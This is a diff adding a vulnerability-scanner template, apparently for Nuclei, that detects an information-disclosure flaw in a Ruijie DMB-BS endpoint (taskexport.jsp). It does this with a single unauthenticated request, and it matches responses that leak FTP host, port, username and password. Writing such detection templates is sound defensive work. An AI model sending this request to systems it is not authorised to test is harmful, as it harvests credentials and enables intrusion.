@@ -1,0 +1,29 @@
+id: xingwangruijie-DMB-BS-taskexport_jsp-Information-disclosure
+
+info:
+  name: 星网锐捷 DMB-BS-taskexport.jsp 信息泄露漏洞
+  author: xxx
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /dmb/out/taskexport.jsp?taskcode HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<ftp'
+          - 'host='
+          - 'port='
+          - 'user='
+          - 'pwd='
+        condition: and
+      - type: status
+        status: 
+          - 200
